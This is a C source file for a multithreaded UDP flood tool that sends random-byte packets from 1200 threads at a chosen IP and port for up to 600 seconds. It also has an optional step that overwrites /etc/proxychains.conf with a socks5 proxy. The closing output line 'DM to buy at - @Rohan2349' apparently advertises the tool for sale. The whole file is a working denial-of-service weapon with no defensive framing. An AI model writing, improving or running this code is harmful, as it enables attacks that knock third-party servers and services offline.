#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>

// Proxy configuration
#define PROXYCHAINS_CONF "/etc/proxychains.conf"
#define MAX_LINE 256

// Number of threads
#define NUM_THREADS 1200

// Global variables for attack
struct attack_params {
    char *target_ip;
    int target_port;
    int packet_size;
    time_t end_time;
    pthread_mutex_t stats_mutex;
    unsigned long long total_packets;
    unsigned long long total_bytes;
};

// Function to update proxychains.conf
int update_proxychains_conf(const char *proxy_ip, int proxy_port) {
    FILE *file = fopen(PROXYCHAINS_CONF, "w");
    if (!file) {
        fprintf(stderr, "Error: Cannot open %s: %s\n", PROXYCHAINS_CONF, strerror(errno));
        return -1;
    }

    fprintf(file, "strict_chain\n");
    fprintf(file, "proxy_dns\n");
    fprintf(file, "tcp_read_time_out 15000\n");
    fprintf(file, "tcp_connect_time_out 8000\n");
    fprintf(file, "[ProxyList]\n");
    fprintf(file, "socks5 %s %d\n", proxy_ip, proxy_port);

    fclose(file);
    return 0;
}

// Thread function for UDP flood
void *flood_thread(void *arg) {
    struct attack_params *params = (struct attack_params *)arg;

    // Create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        fprintf(stderr, "Thread %lu: Cannot create socket: %s\n", pthread_self(), strerror(errno));
        return NULL;
    }

    // Set non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Set up target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    if (inet_pton(AF_INET, params->target_ip, &target_addr.sin_addr) <= 0) {
        fprintf(stderr, "Thread %lu: Invalid IP address: %s\n", pthread_self(), params->target_ip);
        close(sock);
        return NULL;
    }

    // Prepare packet
    char *packet = malloc(params->packet_size);
    if (!packet) {
        fprintf(stderr, "Thread %lu: Cannot allocate packet buffer\n", pthread_self());
        close(sock);
        return NULL;
    }
    for (int i = 0; i < params->packet_size; i++) {
        packet[i] = rand() % 256;
    }

    // Attack loop
    unsigned long long thread_packets = 0;
    unsigned long long thread_bytes = 0;
    while (time(NULL) < params->end_time) {
        ssize_t sent = sendto(sock, packet, params->packet_size, 0,
                              (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent > 0) {
            thread_packets++;
            thread_bytes += sent;
        }
        usleep(50); // Reduced to increase packet rate
    }

    // Update global stats
    pthread_mutex_lock(&params->stats_mutex);
    params->total_packets += thread_packets;
    params->total_bytes += thread_bytes;
    pthread_mutex_unlock(&params->stats_mutex);

    // Clean up
    free(packet);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // Seed random number generator
    srand(time(NULL));

    // Variables for arguments
    char *target_ip = NULL;
    int target_port = 0;
    int attack_time = 0;
    int packet_size = 0;
    char *proxy_ip = NULL;
    int proxy_port = 0;

    // Parse arguments
    if (argc < 5 || argc > 7) {
        fprintf(stderr, "Usage: %s <ip> <port> <time> <packet_size> [--proxy <proxy_ip>:<proxy_port>]\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_time = atoi(argv[3]);
    packet_size = atoi(argv[4]);

    // Validate arguments
    if (target_port < 1 || target_port > 65535) {
        fprintf(stderr, "Error: Port must be between 1 and 65535\n");
        return 1;
    }
    if (attack_time < 1 || attack_time > 600) {
        fprintf(stderr, "Error: Time must be between 1 and 600 seconds\n");
        return 1;
    }
    if (packet_size < 1 || packet_size > 65507) {
        fprintf(stderr, "Error: Packet size must be between 1 and 65507 bytes\n");
        return 1;
    }

    // Parse proxy if provided
    if (argc == 7) {
        if (strcmp(argv[5], "--proxy") != 0) {
            fprintf(stderr, "Error: Expected --proxy flag\n");
            return 1;
        }
        char *proxy_str = argv[6];
        char *colon = strchr(proxy_str, ':');
        if (!colon) {
            fprintf(stderr, "Error: Proxy format must be <ip>:<port>\n");
            return 1;
        }
        *colon = '\0';
        proxy_ip = proxy_str;
        proxy_port = atoi(colon + 1);
        if (proxy_port < 1 || proxy_port > 65535) {
            fprintf(stderr, "Error: Proxy port must be between 1 and 65535\n");
            return 1;
        }

        // Update proxychains.conf
        if (update_proxychains_conf(proxy_ip, proxy_port) != 0) {
            return 1;
        }
    }

    // Initialize attack parameters
    struct attack_params params;
    params.target_ip = target_ip;
    params.target_port = target_port;
    params.packet_size = packet_size;
    params.end_time = time(NULL) + attack_time;
    params.total_packets = 0;
    params.total_bytes = 0;
    pthread_mutex_init(&params.stats_mutex, NULL);

    // Create threads
    pthread_t threads[NUM_THREADS];
    printf("Starting attack on %s:%d for %d seconds, packet size: %d bytes, threads: %d\n",
           target_ip, target_port, attack_time, packet_size, NUM_THREADS);
    if (proxy_ip) {
        printf("Using proxy: %s:%d\n", proxy_ip, proxy_port);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, flood_thread, &params) != 0) {
            fprintf(stderr, "Error: Failed to create thread %d: %s\n", i, strerror(errno));
            pthread_mutex_destroy(&params.stats_mutex);
            return 1;
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    // Clean up
    pthread_mutex_destroy(&params.stats_mutex);

    // Calculate stats
    double total_mb = params.total_bytes / (1024.0 * 1024.0);

    // Output results
    printf("ATTACK COMPLETE\n");
    printf("Total Packet Size: %llu packets\n", params.total_packets);
    printf("Total Data: %.2f MB\n", total_mb);
    printf("DM to buy at - @Rohan2349\n");

    return 0;
}